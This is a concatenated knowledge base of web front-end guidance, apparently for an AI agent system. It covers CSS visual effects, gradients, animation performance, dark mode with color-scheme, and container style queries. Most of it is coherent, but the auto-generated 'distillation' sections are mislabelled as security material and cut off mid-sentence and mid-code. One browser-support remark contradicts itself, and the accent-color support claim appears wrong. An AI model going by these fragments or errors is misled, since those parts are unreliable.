- Use `text-wrap: balance` or `text-wrap: pretty` deliberately, **DO NOT** apply it on `*` as it does have a performance cost.
- Avoid `text-wrap: balance` on elements with a visible box (backgrounds, borders, shadows, etc) as it does not change the container's width, it only affects how text wraps *within* that width. This can leave empty space at the end of the container, which is usually undesirable.

## 8. Visual effects

### Depth and texture

- Layer multiple shadows for realistic soft depth effects.
- Use `filter: drop-shadow()` instead of `box-shadow` for non-rectangular shapes or transparent PNGs.
- Use `mix-blend-mode` and `background-blend-mode` for lighting overlays (limit scope with `isolation: isolate`)

```css
.hero {
  background-image: url('texture.png'), linear-gradient(to bottom, #fff, #eee);
  background-blend-mode: soft-light;
}
```

### Shapes

- Use `corner-shape: squircle` for more aesthetically pleasing curves as a progressive enhancement over regular rounded corners.
- Use elliptical `border-radius` (e.g., `10px / 20px`) for proportional curves without extra elements.

### Gradients and `color-mix()`

Use `in oklch` or `in oklab` to explicitly specify the interpolation color space for gradients or `color-mix()`.
- `in oklch` preserves chroma better, but can more easily get out of device gamut, especially for bigger differences between colors
- `in oklab` stays in gamut more easily (assuming in-gamut endpoints) but can create washed out desaturated colors in the middle, especially when interpolating between opposite hues.
- *DON'T* use `in srgb` unless you have a specific reason to do so (e.g. you are building a color picker that needs to interpolate in srgb).

#### Fallback

Some pre-2024 browsers do not support gradient color interpolation space.
To support these browsers, use the token only when its usage is safe by defining a variable:

```css
:root {
  --in-oklab: ;
  --in-oklch: ;
}

@supports (linear-gradient(in oklab, white, black)) {
  :root {
    --in-oklab: in oklab;
    --in-oklch: in oklch;
  }
}
```

Then use like:

```css
.card {
  background: linear-gradient(to bottom var(--in-oklab), var(--accent-color), var(--darker));
}
```

- **Important:** If you use this technique, make sure there is always a non-empty gradient preamble without it, otherwise it will be a syntax error in older browsers.
- You do NOT need this for `color-mix()`. If a browser supports `color-mix()`, it also supports its `in <color-space>` argument.

### Patterns

Many patterns can be created via CSS gradients + hard stops, and these can be more flexible and performant than SVGs or external images as they can have access to CSS variables and lengths from the surrounding context.
You don't need to repeat the position twice — just use `0` or `0%` and gradient fixup will auto-adjust it.

Examples below.

Vertical stripes of `1em` width each:

```css
background: linear-gradient(to right, var(--color-1) 50%, var(--color-2) 0) 0 / 2em;
```

Diagonal stripes of `1em` width each:

```css
background: repeating-linear-gradient(-45deg, var(--color-1) 0 1em, var(--color-2) 0 2em);
```

Checkerboard pattern with `1em` squares:

```css
background: repeating-conic-gradient(var(--color-1) 0 25%, var(--color-2) 0 50%) 0 / 2em 2em;
```

Polka dot with `.5em` radius dots spaced `2em` apart (horizontally/vertically — multiply by `sqrt(2)` for diagonal distance):

```css
--distance: 2em;
--radius: .5em;
--polka: radial-gradient(circle, var(--color-1) var(--radius), transparent calc(var(--radius) + 1px));
background: var(--polka) 0 0, var(--polka) var(--distance) var(--distance) var(--color-2);
background-size: calc(var(--distance) * 2) calc(var(--distance) * 2);
```

Simple pie chart:

```css
.pie {
  --p: 80%;
  width: 60px;
  aspect-ratio: 1;
  border-radius: 50%;
  background: conic-gradient(var(--color-1) var(--p), transparent 0%) var(--color-2);
}
```

**Important:** When using gradients to render charts, ensure there is a textual fallback for screen readers. MANDATORY: You MUST provide a semantic data table as an accessible alternative, as detailed in `accessibility` (via `npx -y modern-web-guidance@latest retrieve "accessibility"`) under the alternate text and media guidelines.

## 9. Transitions & animations

- Use `clip-path` and `mask-image` for custom geometric reveals and smooth fade-outs.
- Use **Scroll-Driven Animations** (`animation-timeline: scroll()`) for non-essential scroll-bound effects instead of JS listeners.
- Use **View Transitions** to animate between complex layout states seamlessly.

### Performance

Rendering performance is critical for smooth user experiences, especially in heavy DOM trees.

- Prefer to animate `opacity` and `transform` (including individual transform properties, e.g. `translate` instead of `left/right/top/bottom`) to ensure animations stay on the compositor thread.
- Use `transition-behavior: allow-discrete` + `@starting-style` to animate layout properties like `display` or `<dialog>` state natively.
- Always pair `content-visibility` with `contain-intrinsic-size` to prevent scrollbar jumps (CLS).
- When setting `contain-intrinsic-size` use the `auto` keyword and a value that’s derived from what is known about the contents (i.e. text size, spacing, size of graphics, character count). Preferably use units such as `rem`, `lh`, `cap`, or `ch` that match values used for the elements within the contents rather than `px`. If the content for items in a group is not consistently sized, then use an average size.
- Use `contain: layout style paint` to isolate component rendering updates.

#### Code Example: Render Optimization

```css
.large-section {
  content-visibility: auto;
  contain-intrinsic-block-size: auto 800px;
}

.row {
  --row-gap: .4rem;
  --title-height: 1lh;
  --description-height: 0.85lh;

  display: grid;
  row-gap: var(--row-gap);
  content-visibility: auto;
  /* The sum of the title height, row gap, and description height should be the size of the contents when skipped for rendering. */
  contain-intrinsic-block-size: auto calc(var(--title-height) + var(--row-gap) + var(--description-height));
}

.popover-reveal {
  /* Allow discrete animations for display transitions */
  transition: display 0.2s allow-discrete;
}
```

### Accessibility

Use `prefers-reduced-motion` media queries to turn off heavy motion for users who prefer it.

**DO NOT** globally apply `animation-duration: 0.01ms;` globally as it can cause certain animations to become _more_ jarring.
Either apply reduced motion versions on a case by case basis, or use a custom property like:

```css
@property --animation-reduced {
  syntax: "*";
  inherits: false;
  initial-value: none;
}

@media (prefers-reduced-motion: reduce) {
  * {
    animation: var(--animation-reduced) !important;
  }
}
```

Then, reduced motion versions can be kept together with the original animations:

```css
progress:not([value]) {
  animation: slide 1s infinite linear;
  --animation-reduced: slide 20s infinite linear;
}
```

## 10. Generated content

- **DON'T** use `content` to convey meaningful text (labels, state, instructions) — keep that in the DOM (WCAG F87). The alt text argument is harm reduction for cases where decoration accidentally carries meaning, not a license.
- Use the alternative text argument of `content` to provide alt text for screen readers. E.g. `content: url(cloud.svg) / "Save";`
- Use `content: "text" / "";` to prevent purely decorative text from being announced to screen readers.
- **DON'T** use an empty alt text argument for images — they're already presentational by default. E.g. this is wrong: `content: url(cloud.svg) / "";`.
- **DON'T** use the alt text argument to describe emojis unless the description differs from the official emoji name. E.g. don't do `content: "🎉" / "celebration";`, but `content: "🎉" / "Yay!";` is fine.

**ONLY** use the alt text argument when the text is different than the primary value and is not already present in the DOM. I.e. this is wrong:

HTML:
```html
<button class="save">Save</button>
```

CSS:
```css
button.save::before {
  content: url(cloud.svg) / "Save";
}
```

A screen reader would read it out as "Save save".


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, database, ui-ux, performance, tdd, vcs, saas, api]

### 📘 KNOWLEDGE: NEXUS_DARK-MODE.MD

# Dark mode
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The `color-scheme` property indicates which color schemes (such as light or dark) your page supports. This informs the browser that it can automatically theme native UI elements—like scrollbars, form controls, and the default canvas background—to match your site's design and help minimize white flashes during initial loading.

## Implementation

### 1. Declare supported schemes in HTML

MANDATORY: To help prevent a "flash of un-themed content" (FOUC), place a `<meta>` tag in your `<head>` to ensure the browser knows which themes you support before it even starts rendering. While this `<meta>` tag helps to avoid FOUC by setting the initial canvas color early, it may not completely eliminate flashes in all browsers or loading conditions.

```html
<!-- MANDATORY: Declare support for both light and dark themes -->
<meta name="color-scheme" content="light dark">
```

### 2. Apply page-wide color scheme to CSS :root or html

MANDATORY: Apply the `color-scheme` property to the `html` element or the `:root` pseudo-class. Browsers specifically look to the root element to determine the theme for the entire viewport—including the root scrollbars and the initial "canvas" background. If applied only to the `body`, these global UI surfaces may remain in light mode because the `body` does not control the window's rendering context.

```css
/* MANDATORY: Apply color-scheme to :root or html for viewport-wide theming */
:root {
  /* MANDATORY: Automatically adapt native UI to user system preferences */
  color-scheme: light dark;
}
```

### 3. Define light and dark color tokens

You can use the `light-dark()` function to define color tokens that automatically adapt to different `color-scheme` values.

It is recommended that you also keep the raw color values in separate custom properties, which makes it easier to combine them in different ways (and makes fallback behavior easier, if needed).

For more control over the colors of built-in UI such as `accent-color` or `scrollbar-color`, authors **can optionally** add their own dynamic colors with use of custom properties and/or the `light-dark()` function. This function automatically picks the correct color based on the computed `color-scheme` of the element and eliminates the need for redundant media queries, but is not required for a basic implementation.

```css
:root {
  --color-brand-light: oklch(45% 0.23 270);
  --color-brand-dark: oklch(85% 0.15 210);
  --color-brand-text-light: white;
  --color-brand-text-dark: oklch(40% 0.23 270);

  --color-brand: light-dark(var(--color-brand-light), var(--color-brand-dark));
  --color-brand-text: light-dark(var(--color-brand-text-light), var(--color-brand-text-dark));

  /* MANDATORY: Automatically adapt native UI to user system preferences */
  color-scheme: light dark;
}

button.primary {
  /* These automatically adapt to color scheme */
  background-color: var(--color-brand);
  color: var(--color-brand-text);
}
```

OPTIONAL: A number of system colors are available, which also automatically adapt to the used color scheme (and other color modes, e.g. forced colors), such as `canvas`, `canvastext`, `accentcolor` (check support) , `buttonborder` etc. These are typically too limited to be useful, beyond very specific cases where you need to exactly match certain default browser UI or as fallbacks/defaults.

#### OPTIONAL: Tailor color pairs to context

Even when overriding the system default, it can be useful to use the `prefers-color-scheme` media query to define **different** color pairs that take into account the colors of the browser and OS chrome around the page (or of the surrounding page, when the page is used as an iframe).

For example, use a slightly dimmer light theme when the system setting is `dark`, or a more contrasting dark theme when the system setting is `light`, so the page is not visually overpowered by the surrounding UI.


## Fine-grained browser UI customization

Setting `color-scheme` already adapts browser UI to the used color scheme, but this will use OS defaults and/or system colors that may not perfectly align with the website design.
Modern browsers expose several fine-grained customization hooks for these.
Do not reimplement native controls simply to customize their appearance without exhausting the customization hooks modern browsers provide.

### Setting the accent color

Some browser UI (e.g. checked checkboxes or sliders) uses an accent color.
This resolves to the OS setting by default, but you can use the `accent-color` property to set it to a color that better aligns with the page, such as the page's brand color.

```css
html {
  accent-color: light-dark(var(--color-accent-light), var(--color-accent-dark));
}
```

### Issues to be aware of when using accent-color

- When placing visual elements over the accent color (e.g. a checkbox checkmark), Chrome and Safari will automatically select a contrasting color, whereas Safari will modify the accent color, and may not maintain adequate contrast.

### Scrollbar colors

You can use `scrollbar-color` together with `light-dark()` to set custom scrollbar colors that adapt to the color scheme used.

```css
:root {
  --color-scrollbar-track: light-dark(#eee, #222);
  --color-scrollbar-thumb: light-dark(#999, #666);
  scrollbar-color: var(--color-scrollbar-thumb) var(--color-scrollbar-track);
}
```

### Issues to be aware of when using scrollbar-color

- Do NOT animate or transition `scrollbar-color`. A [WebKit bug](https://bugs.webkit.org/show_bug.cgi?id=311752) causes the scrollbar to flicker every time `scrollbar-color` changes.
- On macOS, `scrollbar-color` (standard) and `::-webkit-scrollbar` (legacy) properties are ignored by default because macOS uses native "overlay" scrollbars. You MUST pair custom colors with `scrollbar-width` (e.g., `thin` or `auto`) to force macOS to render them.
- Even with `scrollbar-width` applied, macOS overlay scrollbars render the track (gutter) as transparent by default. If the design requires a visible track background color on MacOS, you MUST apply `scrollbar-gutter: stable;` to the scrollable container, but note that it only appears after the user hovers over the scrollbar.
- Even with `scrollbar-gutter: stable` the track may be transparent on MacOS. The thumb should not depend on the track color to be visible.

### Further customization

Most browser UI exposes pseudo-elements to fully customize its appearance, such as:
- `::placeholder`
- `::spelling-error`
- `::grammar-error`
- `::selection`
- `::search-text`
- `::target-text`
- `::file-selector-button`

You can use `light-dark()` colors on any of these to apply colors that adapt to the used color scheme.

## OPTIONAL: Implementing a color-scheme toggle

**DO NOT** set `color-scheme: light` or `color-scheme: dark` on the root element by default.
The default color-scheme MUST be the user's system preference, which happens automatically when setting `color-scheme` to `light dark`.

For website-specific customization, a manual toggle could be provided to allow users to choose between light, dark, or system-default modes.

If a user-facing toggle to override it is desired, it should:
- Update the `<meta name="color-scheme">` element to reflect the chosen theme (`light dark` for system default, `light` for light, and `dark` for dark).
- If branching is desired for non-color values, set a class on `<html>` to match the theme preference and use descendant selectors. While `:root:has(> head > meta[name="color-scheme"][content="dark"])` would technically work, it is slower and confers no benefit, since we are already using JS to update the `<meta>` element.
- Persist user choice in `localStorage`.
- **IMPORTANT**: The CSS should be written to default to the system preference, with overrides for user-specified color-schemes. That way, if JS fails to execute, the site still defaults to the system color-scheme.
- The system-level OS theme can change at any time. If you are using JS to read `matchMedia("(prefers-color-scheme: dark)").matches`, you MUST also use `addEventListener("change", fn)` to react to changes. CSS automatically adapts to changes.
- **IMPORTANT**: To avoid a Flash of Unstyled Content (FOUC) for users who have pinned a different color scheme than their system default, use an inline script (NOT `type=module`, NOT `defer`) to set it when the page loads:

```html
<meta name="color-scheme" content="light dark">
<script>
{
  const colorScheme = localStorage.getItem("color-scheme");
  if (colorScheme) {
    document.querySelector('meta[name="color-scheme"]').content = colorScheme;
  }
}
</script>
```

### UX considerations

Use a two-state control:
1. System setting.
2. The opposite (e.g. light when the system setting is dark, and dark when the system setting is light). Selecting this setting must pin that exact color scheme, not a dynamically computed "opposite of system setting" value. Example scenario:
    1. The OS is set to light mode.
    2. The user selects the opposite setting for this website (dark).
    3. The user changes their system setting to dark.
    4. The website should remain dark.

**DON'T** expose all three states (system, light, dark). While the rationale is plausible — "Follow system (currently dark)" is a distinct user intent from "Always dark" — it provides suboptimal UX:
- Users cannot meaningfully express intent for problems they don't currently have. A manual toggle is a temporary comfort adjustment ("it's too bright right now"), not a long-term preference ("make sure this never changes").
- Two of the three options always produce the same visual result, violating the principle of feedback.

## Component-specific overrides

You can override the global theme for specific elements by setting `color-scheme` on them.
This is useful for "dark mode" sections within a light-themed site, such as code blocks or media players.

```css
pre, code {
  /* Forces element and its children to use dark themed UI */
  color-scheme: dark;
}
```

For more information about component-specific overrides and their gotchas, see `component-specific-light-dark-theme` (via `npx -y modern-web-guidance@latest retrieve "component-specific-light-dark-theme"`).

## Known issues to be aware of

### Issues to be aware of when using color-scheme

- Chrome and Firefox respect `color-scheme` for iframes: they render embedded pages in the correct color scheme and adjust the embedded page's `prefers-color-scheme` media query to reflect the embedding context's `color-scheme`. Safari does not, and resolves `prefers-color-scheme` to the system setting even inside iframes.
  - **If you control both parent and iframe:** pass the parent's color scheme to the iframe explicitly — via a URL parameter (`?theme=dark`) at iframe construction time, or via `postMessage()` (which also lets you react to runtime changes). In the iframe, set a class on `<html>` (and/or `color-scheme` on `:root`) from that signal instead of relying on `prefers-color-scheme`.
  - **If you only control the embedded page:** there is no reliable way to detect the embedding context's `color-scheme` from inside the iframe in Safari. Expose an explicit theme parameter on your embed API (e.g. a query string or `postMessage` protocol) and document it for embedders.

## Fallback strategies

### Fallbacks & browser support for color-scheme

Baseline status for color-scheme: Widely available. It's been Baseline since 2022-02-03.
Supported by: Chrome 98 (Feb 2022), Edge 98 (Feb 2022), Firefox 96 (Jan 2022), and Safari 13 (Sep 2019).

The `color-scheme` property is **progressive enhancement**.
Browsers that do not support it will ignore this property and use their default light-mode UI.

To adapt to the user's preferences in older browsers, use `prefers-color-scheme` media queries to provide different colors when dark mode is preferred.

- DO use the media query to switch custom properties on `:root` or `html`
- Avoid using the media query on individual components unless the component requires a very specific type of dark mode customization beyond colors.

```css
:root {
  /* Define brand colors for each mode */
  --color-brand-light: #0056b3;
  --color-brand-dark: #00e5ff;
  --color-brand: var(--color-brand-light);

  /* MANDATORY: Fallback for browsers without light-dark support */
  @media (prefers-color-scheme: dark) {
    --color-brand: var(--color-brand-dark);
  }

  /* Ignored in older browsers */
  color-scheme: light dark;
}

button.primary {
	background-color: var(--color-brand);
}
```

### Fallbacks & browser support for light-dark()

Baseline status for light-dark(): Newly available. It's been Baseline since 2024-05-13.
Supported by: Chrome 123 (Mar 2024), Edge 123 (Mar 2024), Firefox 120 (Nov 2023), and Safari 17.5 (May 2024).

For browsers that support `color-scheme` but not yet `light-dark()`, light and dark versions of colors should first be defined as custom properties, and the `prefers-color-scheme` media query should be used to set colors for the respective mode like in the example below:

```css
:root {
  /* Define browser UI accent color for each mode */
  --brand-accent-light: #0056b3;
  --brand-accent-dark: #00e5ff;
  --accent-color: var(--brand-accent-light);

  /* MANDATORY: Fallback for browsers without light-dark support */
  @media (prefers-color-scheme: dark) {
    --accent-color: var(--brand-accent-dark);
  }

  /* OPTIONAL: use light-dark() for more control of built-in UI colors */
  @supports (color: light-dark(white, black)) {
    --accent-color: light-dark(var(--brand-accent-light), var(--brand-accent-dark));
  }

  /* MANDATORY: Automatically adapt native UI to user system preferences */
  color-scheme: light dark;

  /* Example inherited color property */
  accent-color: var(--accent-color);
}

pre, code {
  color-scheme: dark;

  /* **Mandatory**: any inherited color properties must be set again, even if to the same design tokens */
  accent-color: var(--accent-color);
}
```

### Fallbacks & browser support for scrollbar-color

Baseline status for scrollbar-color: Newly available. It's been Baseline since 2025-12-12.
Supported by: Chrome 121 (Jan 2024), Edge 121 (Jan 2024), Firefox 64 (Dec 2018), and Safari 26.2 (Dec 2025).

This feature is progressive enhancement and does not always require fallbacks.

If the styling is important and the user's Baseline target is "Baseline Widely Available" or earlier, you SHOULD include the non-standard `::-webkit-scrollbar` pseudo-elements as fallbacks.

Wrap legacy fallbacks in an `@supports not (scrollbar-color: auto)` block to prevent conflicts between standard properties and legacy WebKit selectors in browsers that support both natively.

If you are using custom properties to define colors, these will cascade to the legacy WebKit selectors automatically. You do NOT need to duplicate them.

```css
/* Legacy fallback for WebKit/Blink browsers */
@supports not (scrollbar-color: auto) {
  .scroller::-webkit-scrollbar {
    /* Must define base size in WebKit for custom colors to be visual */
    width: 12px;
    height: 12px;
  }

  .scroller::-webkit-scrollbar-thumb {
    background: var(--scrollbar-thumb);
  }

  .scroller::-webkit-scrollbar-track {
    background: var(--scrollbar-track);
  }
}
```

### Fallbacks & browser support for accent-color

accent-color has limited availability.
Supported by: Chrome 93 (Aug 2021), Edge 93 (Sep 2021), and Firefox 92 (Sep 2021).
Unsupported in: Safari.

The `accent-color` property is progressive enhancement.
Browsers that do not support this property will ignore it and use their default UI colors.


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux, tdd, vcs]

### 📘 KNOWLEDGE: NEXUS_DESIGN-TOKEN-REACTIVITY.MD

> **VERSION**: v1 | **Last Updated**: 26/05/2026

## Background & Overview

Often an author will need to make contextual changes to the design of a component. Historically authors would need to use selectors to apply such changes. This often meant that while many of their design tokens could exist as custom properties, higher-order design tokens could only be encoded as a selector pattern (i.e. using a class name or attribute convention) or as props/context in a JavaScript framework.

**Container style queries** allow authors to style elements based on the computed custom property value of an ancestor element. This means authors can write meaningful design token values within their stylesheets rather than relying on markup or JavaScript for presentation.

## How to implement

Implementing a reactive design token using a container style query is quite straightforward:

1. Set the higher-order design token as a custom property on a container. This does not need to be a registered custom property.
2. Use the `@container style()` rule to query the value of that custom property.
3. Apply the appropriate styles to a descendant element within the container.

A few things to keep in mind:

- The container being queried with a style query does not need to have a `container-type` or `container-name` set, however, a `container-name` can allow for more specific querying.
- The container itself cannot be styled by the container style query.

The following is a basic example of the above implementation steps.

```html
<div class="features">
  <div class="card"></div>
  <div class="card"></div>
</div>
<div class="bugs">
  <div class="card"></div>
  <div class="card"></div>
  <div class="card"></div>
  <div class="card"></div>
</div>
```

```css
.features {
  --density: spacious;
}

.bugs {
  --density: compact;
}

@container style(--density: compact) {
  .card {
    padding: 8px;
  }
}

@container style(--density: spacious) {
  .card {
    padding: 24px;
  }
}
```

## Fallback strategies

Container style queries has limited availability.
Supported by: Chrome 111 (Mar 2023), Edge 111 (Mar 2023), and Safari 18 (Sep 2024).
Unsupported in: Firefox.

Until there is Baseline support for container style queries it is NOT RECOMMENDED that they be used for core features that must be available across all browsers, since it is not simple to create a fallback for them that does not take away from their benefits or that have their own limitations. For example, if a UI density user preference is not deemed to be a core feature that must be available across all experiences, then container style queries can be use to implement the feature without a fallback.

### Using selectors instead

For core features, an alternate approach using selectors should be used. This example uses a `data-density` attribute to encode the density design token in the markup rather than as a custom property:

```html
<div class="features" data-density="spacious">
  <div class="card"></div>
  <div class="card"></div>
</div>
<div class="bugs" data-density="compact">
  <div class="card"></div>
  <div class="card"></div>
  <div class="card"></div>
  <div class="card"></div>
</div>
```

```css
/* This example uses `:where()` to avoid increasing specificity */
:where([data-density="compact"]) .card {
  padding: var(--card-padding-compact);
}

:where([data-density="spacious"]) .card {
  padding: var(--card-padding-spacious);
}
```

A major limitation of this fallback approach is that it does not support nesting elements with the `data-density` attribute set, since the selector specificity is the same, order of appearance will be used to determine the styles (i.e. `[data-density="spacious"]` will always take precendence over `[data-density="compact"]`).

### Using style queries as a progressive enhancement

While it’s NOT RECOMMENDED, if you want to use style queries as a progressive enhancement for a core feature, then to avoid duplication you can create some custom properties, then include the style queries after. Make sure the fallback approach uses `:where()` when selecting the container elements to avoid increasing the specificity.

```css
.card {
  --card-padding-compact: 8px;
  --card-padding-spacious: 24px;
}

:where([data-density="compact"]) .card {
  padding: var(--card-padding-compact);
}

:where([data-density="spacious"]) .card {
  padding: var(--card-padding-spacious);
}

/* Use style queries as a progressive enhancement: same specificity, so order of appearance is used */

@container style(--density: compact) {
  .card {
    padding: var(--card-padding-compact);
  }
}

@container style(--density: spacious) {
  .card {
    padding: var(--card-padding-spacious);
  }
}
```

### Feature-checking with just CSS

If you need to feature check container style queries to conditionally display some UI that relies on it, you can use a style query to do so:

```css
:root {
  --style-queries-supported: check;
}

.density-toggle {
  display: none;
}

@container style(--style-queries-supported) {
  .density-toggle {
    display: revert;
  }
}
```

### Feature-checking with JavaScript

For feature-checking with JavaScript, it is slightly more complicated as the `CSSContainerRule` interface existed prior to the addition of container style queries, so it is unreliable for this purpose. Instead, you’ll need to check the computed value of a known property that is being set with a style query.

This example uses a custom property as it will have no visual effect:

```css
:root {
  --style-queries-supported: check;
}

@container style(--style-queries-supported: check) {
  body {
    --style-queries-supported: yes;
  }
}
```

Then check the computed value in JavaScript like this:

```js
if (getComputedStyle(document.body).getPropertyValue("--style-queries-supported") === "yes") {
  // Use container style queries
} else {
  // Use fallback strategy
}
```



---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux]

### 📘 KNOWLEDGE: NEXUS_DISTILLATION_SECURITY.MD

> **VERSION**: v3 | **Last Updated**: 26/05/2026



## 🎓 SECURITY WISDOM DISTILLATION [v1109] - 26/05/2026
> **Protocol**: Autonomous Intelligence Extraction | **Focus**: Actionable Tech Insights

### 📄 Dark mode
> **Origin**: `guides/user-experience/[dark-mode.md](NEXUS_DARK-MODE.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
The `color-scheme` property indicates which color schemes (such as light or dark) your page supports. This informs the browser that it can automatically theme native UI elements—like scrollbars, form controls, and the default canvas background—to match your site's design and help minimize white flashes during initial loading.





MANDATORY: To help prevent a "flash of un-themed content" (FOUC), place a `<meta>` tag in your `<head>` to ensure the browser knows which themes you support before it even starts rendering. While this `<meta>` tag helps to avoid FOUC by setting the initial canvas color early, it may not completely eliminate flashes in all browsers or loading conditions.

```html
<!-- MANDATORY: Declare support for both light and dark themes -->
<meta name="color-scheme" content="light dark">
```



MANDATORY: Apply the `color-scheme` property to the `html` element or the `:root` pseudo-class. Browsers specifically look to the root element to determine the theme for the entire viewport—including the root scrollbars and the initial "canvas" background. If applied only to the `body`, these global UI surfaces may remain in light mode because the `body` does not...

#### 🔗 Traceability:
- [Source Context]([dark-mode.md](NEXUS_DARK-MODE.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Background & Overview
> **Origin**: `guides/user-experience/[design-token-reactivity.md](NEXUS_DESIGN-TOKEN-REACTIVITY.MD)` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
Often an author will need to make contextual changes to the design of a component. Historically authors would need to use selectors to apply such changes. This often meant that while many of their design tokens could exist as custom properties, higher-order design tokens could only be encoded as a selector pattern (i.e. using a class name or attribute convention) or as props/context in a JavaScript framework.

**Container style queries** allow authors to style elements based on the computed custom property value of an ancestor element. This means authors can write meaningful design token values within their stylesheets rather than relying on markup or JavaScript for presentation.



Implementing a reactive design token using a container style query is quite straightforward:

1. Set the higher-order design token as a custom property on a container. This does not need to be a registered custom property.
2. Use the `@container style()` rule to query the value of that custom property.
3. Apply the appropriate styles to a descendant element within the container.

A few things to keep in mind:

- The container being queried with a style query does not need to have a `contai...

#### 🔗 Traceability:
- [Source Context]([design-token-reactivity.md](NEXUS_DESIGN-TOKEN-REACTIVITY.MD))
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---


---
> **METADATA (NEXUS SEMANTIC TAGS)**: [security, ui-ux]

### 📘 KNOWLEDGE: NEXUS_DISTILLATION_UI-UX.MD

## 🎓 UI-UX WISDOM DISTILLATION [v1100] - 26/05/2026
> **Protocol**: Autonomous Intelligence Extraction | **Focus**: Actionable Tech Insights

### 📄 Accessible Error Announcement
> **Origin**: `ui-ux/NEXUS_ACCESSIBLE-ERROR-ANNOUNCEMENT.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action has occurred.

#### 🔗 Traceability:
- [Source Context](NEXUS_ACCESSIBLE-ERROR-ANNOUNCEMENT.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Implementation
> **Origin**: `ui-ux/NEXUS_ANIMATE-TO-FROM-TOP-LAYER.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v4 | **Last Updated**: 26/05/2026

Elements that render in the "top layer" (like `<dialog>`, elements with the `popover` attribute, or tooltips) have historically been difficult to animate because they toggle between `display: none` and a visible state. Modern CSS provides `@starting-style`, `transition-behavior: allow-discrete`, and the `overlay` property to enable smooth entry and exit transitions for these elements. Note that native CSS nesting is used in the examples below.





To animate the `display` property, you must set `transition-behavior: allow-discrete`. This allows the element to remain visible during its exit transition. If using transition shorthands, be sure to place the `transition-behavior: allow-discrete` afterwards to prevent the shorthand from negating it.



When an element moves in or out of the top layer, it must transition the `overlay` property. This ensures the element stays in the top layer for the duration of the animation, preventing it from being clipped by other elements or the viewport prematurely.



Use the `@starting-style` at-rule to define the styles an element should transition *from* when it is first rendered or...

#### 🔗 Traceability:
- [Source Context](NEXUS_ANIMATE-TO-FROM-TOP-LAYER.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Animate to Intrinsic Sizes
> **Origin**: `ui-ux/NEXUS_ANIMATE-TO-INTRINSIC-SIZES.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
action (e.g., `:hover` or a state class).
4.  **Perform calculations (Optional)**: Use `calc-size()` if you need to perform math on an intrinsic size (e.g., `auto + 2rem`). `calc-size()` also supports the `any` keyword for basis-agnostic calculations.

#### 🔗 Traceability:
- [Source Context](NEXUS_ANIMATE-TO-INTRINSIC-SIZES.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Animated Select Picker
> **Origin**: `ui-ux/NEXUS_ANIMATED-SELECT-PICKER.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The customizable select API offers a declarative, CSS-driven way to animate `<select>` elements and their dropdown pickers. By combining `appearance: base-select` with modern CSS animation techniques—such as `@starting-style` and the `allow-discrete` transition behavior—you can create fluid, premium UI transitions for top-layer elements without relying on heavy JavaScript libraries.

Previously, animating native select dropdowns was impossible because their UI was rendered outside the accessible viewport constraints. With `appearance: base-select`, the picker becomes styleable and animatable like any other page element.



To implement an animated select picker:

1. **Opt-in to customization:** Apply `appearance: base-select` to both the `<select>` element and the `::picker(select)` pseudo-element.
2. **Enable auto-sizing transitions (Optional):** Define `interpolate-size: allow-keywords` (usually on `:root`) to allow the browser to transition between discrete metric values like `height: auto` and `height: 0`.
3. **Animate the top-layer container:** Apply standard entry/exit styles to `::picker(select)`. To make sure th...

#### 🔗 Traceability:
- [Source Context](NEXUS_ANIMATED-SELECT-PICKER.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 Apply WebGL shaders to HTML content
> **Origin**: `ui-ux/NEXUS_APPLY-WEBGL-SHADERS.MD` | **Distilled At**: 26/05/2026

#### 🛠 Actionable Steps:
Action</button>
  </div>
</canvas>

<script>
  const canvas = document.getElementById("canvas");
  const gl = canvas.getContext("webgl");
  const uiElement = document.getElementById("ui-element");

  // Setup WebGL texture...
  const texture = gl.createTexture();
  gl.bindTexture(gl.TEXTURE_2D, texture);

  canvas.onpaint = () => {
    // 1. Update texture with HTML content
    if (gl.texElementImage2D) {
      gl.texElementImage2D(
        gl.TEXTURE_2D,
        0,
        gl.RGBA,
        gl.RGBA,
        gl.UNSIGNED_BYTE,
        uiElement,
      );
    }

    // ... Render your 3D scene here, calculating htmlElementMVP matrix ...

    // 2. Sync DOM position with 3D scene
    if (canvas.getElementTransform) {
      const mvpDOM = new DOMMatrix(Array.from(h

#### 🔗 Traceability:
- [Source Context](NEXUS_APPLY-WEBGL-SHADERS.MD)
- [Related Standards](NEXUS_CORE_PRINCIPLES.md)

---
### 📄 System Architecture
> **Origin**: `ui-ux/NEXUS_ARCHITECTURE.MD` | **Distilled At**: 26/05/2026

#### 💡 Content Summary:
> **VERSION**: v1 | **Last Updated**: 26/05/2026



The Human-AI Nexus is built as a modular orchestration system.



```mermaid
graph TD
    User([User/Human]) -- Approval --> PM[Project Manager Agent]
    User -- Initial Request --> Orc[Nexus Orchestrator]
    
    subgraph "Core Engine"
        Orc -- Trigger --> Audit[Audit Phase]
        Audit -- Results --> Plan[Planning Phase]
        Plan -- Tasks --> Exec[Execution Phase]
        Exec -- Success --> Record[Finalization Phase]
    end
    
    subgraph "Knowledge & Standards"
        Agent[(Agent Library)]
        Skill[(Skill/Standards)]
        Knowledge[(Knowledge Base)]
    end
    
    Audit -.-> Agent
    Plan -.-> Skill
    Record -.-> Knowledge
    
    Record -- Recursive --> Audit
```




The central brain that coordinates the flow between phases. It ensures that data from the Audit phase is correctly passed to Planning, and that Execution only happens after approval.


A collection of markdown files in `agent/` that define the persona, responsibilities, and guardrails for different AI agents (e.g., Architect, Engineer, QA).


Technical standards and "best practice" snippets ...

#### 🔗 Traceability:
